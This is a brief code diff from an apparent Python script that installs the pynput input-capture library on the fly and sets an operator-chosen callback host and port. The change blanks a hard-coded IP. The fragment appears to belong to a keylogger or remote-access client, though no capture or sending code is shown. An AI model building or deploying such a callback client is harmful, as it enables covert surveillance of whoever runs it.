@@ -15,7 +15,7 @@ except ModuleNotFoundError:
     call(["pip", "install", "pynput"], shell=True)
 
 # change this to your ip and port:
-HOST = "10.10.217.45"
+HOST = ""
 PORT = 420
 # -----------------------------------------
 BUFFER = 4096
